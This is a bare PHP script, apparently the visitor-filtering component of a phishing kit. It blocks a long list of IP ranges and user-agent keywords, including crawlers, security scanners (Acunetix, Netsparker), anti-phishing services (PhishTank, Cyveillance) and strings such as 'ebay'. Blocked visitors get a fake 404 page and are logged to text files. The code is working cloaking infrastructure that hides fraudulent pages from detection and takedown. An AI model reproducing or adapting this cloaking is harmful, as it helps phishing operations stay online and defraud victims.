<?
$id = $_SERVER['REMOTE_ADDR'];
$ips = array(
"^66.211.160.86*", "^46.244.*.*", "^66.102.6.214", "^66.102.6.210", "^66.102.6.70", "^64.235.154.109", "^184.173.226.*", "^38.100.21.*", "^64.12.116.136", "^68.173.121.21",  "^64.126.47.158", "^63.233.238.138", "^66.102.6.5", "^38.100.21.84", "^184.173.211.16", "^213.205.194.201", "^65.186.59.242", "^64.71.204.102", "^68.109.51.108",  "^64.235.153.10", "^66.102.8.*", "^66.102.8.194","^64.235.154.105","^204.14.15.11", "^68.255.164.66", "^68.192.199.223", "^65.196.107.250", "^66.249.88.29", "^68.193.47.49", "^68.194.97.211", "^68.74.176.80", "^184.173.200.19", "^68.190.98.116", "^64.12.116.143", "^68.118.13.98", "^63.228.115.96", "^65.28.231.144", "^68.224.151.183", "^68.227.43.12", "^64.71.197.150", "^64.71.193.106", "^68.134.219.104", "^68.193.139.12", "^213.233.150.35", "^68.106.27.168", "^207.181.235.47", "^66.102.6.125", "^66.249.83.159", "^68.109.173.88", "^68.203.26.28", "^204.227.128.245", "^63.224.244.242", "^207.200.116.137", "^204.38.0.253", "^74.69.172.222", "^68.206.60.110", "^68.235.253.96", "^74.64.72.43", "^207.74.209.246", "^64.233.245.126", "^65.24.232.9", "^66.102.6.96", "^66.102.6.127", "^68.153.219.27", "^207.183.178.41", "^68.196.124.69", "^65.120.2.155", "^68.6.93.18", "^68.204.255.228", "^68.96.216.13", "^68.118.156.162", "^207.173.210.12", "^204.154.221.162", "^204.11.187.222", "^66.249.88.27", "^213.32.91.89", "^66.102.8.7", "^64.233.172.148", "^64.233.172.146", "^64.233.172.150", "^66.102.6.221", "^63.209.10.245", "^131.*.*.*", "^198.255.175.51", "^64.236.208.27", "^66.249.88.5", "^68.97.193.34", "^66.102.6.121", "^66.102.6.125",  "^68.44.178.255", "^66.249.83.219", "^68.105.47.131", "^68.73.147.30", "^204.210.196.10", "^68.198.6.254", "^65.113.252.97", "^68.193.145.72", "^204.11.157.92", "^64.12.117.7", "^68.193.174.26", "^184.173.211.17", "^38.100.21.87", "^157.*.*.*", "^202.*.*.*", "^204.*.*.*", "^207.*.*.*", "^213.*.*.*", "^219.*.*.*", "^63.*.*.*", "^64.*.*.*", "^65.*.*.*", "^68.*.*.*", "^64.*.*.*", "^64.233.160.*", "^64.233.191.*", "^64.233.191.255*",  "^66.102.*.*", "^66.249.*.*", "^72.14.*.*", "^74.125.*.*", "^209.85.*.*", "^216.239.*.*", "^64.4.*.*", "^65.52.*.*", "^131.253.*.*", "^157.54.*.*", "^207.46.*.*", "^207.68.*.*", "^8.12.*.*", "^66.196.*.*", "^66.228.*.*", "^67.195.*.*", "^68.142.*.*", "^72.30.*.*", "^74.6.*.*", "^98.136.*.*", "^202.160.*.*", "^209.191.*.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*",
);
foreach($ips as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
		header("HTTP/1.0 404 Not Found");
		$ip = getenv("REMOTE_ADDR");
		$file = fopen("001_bot.txt","a");
		fwrite($file," user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
		echo"<br>";
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
	 
$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
     "bot",
     "above",
     "google",
     "softlayer",
	 "amazonaws",
	 "cyveillance",
	 "phishtank",
	 "dreamhost",
	 "netpilot",
	 "calyxinstitute",
	 "tor-exit",
	 "apache-httpclient",
	 "lssrocketcrawler",
	 "crawler",
	 "urlredirectresolver",
	 "jetbrains",
	 "spam",
	 "windows 95",
	 "windows 98",
	 "acunetix",
	 "netsparker",
	 "007ac9",
	 "008",
	 "192.comagent",
	 "200pleasebot",
	 "360spider",
	 "4seohuntbot",
	 "50.nu",
	 "a6-indexer",
	 "admantx",
	 "amznkassocbot",
	 "aboundexbot",
	 "aboutusbot",
	 "abrave spider",
	 "accelobot",
	 "acoonbot",
	 "addthis.com",
	 "adsbot-google",
	 "ahrefsbot",
	 "alexabot",
	 "amagit.com",
	 "analytics",
	 "antbot",
	 "apercite",
	 "aportworm",
	 "EBAY",
	 "CL0NA",
	 "jabber",
	 "ebay",
	 "arabot",
	 "hotmail!",
	 "msn!",
	 "outlook!",
);

foreach($blocked_words as $word2) {
    if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "	") {
		header("HTTP/1.0 404 Not Found");
		$ip = getenv("REMOTE_ADDR");
		$file = fopen("bot-_-.txt","a");
		fwrite($file," user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
		echo"<br>";
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
?>